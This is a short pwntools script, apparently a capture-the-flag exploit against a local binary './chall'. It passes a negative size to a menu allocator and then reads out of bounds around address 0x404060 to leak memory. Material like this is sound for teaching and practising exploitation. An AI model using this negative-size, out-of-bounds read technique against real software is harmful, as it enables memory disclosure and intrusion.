from pwn import *

def create(index, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index > ', b'%d' % index)
    io.sendlineafter(b'size > ', b'%d' % size)

def put(index, pos):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index > ', b'%d' % index)
    io.sendlineafter(b'pos > ', b'%d' % pos)

def read(index, pos):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index > ', b'%d' % index)
    io.sendlineafter(b'pos > ', b'%d' % pos)

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

create(0, -1)
for i in range(10):
    read(0, (0x404060+i*4)/4)
    io.recvuntil(b'data >')
    x = p32(int(io.recvuntil(b'\n', drop=True)))
    print(x)

io.interactive('')

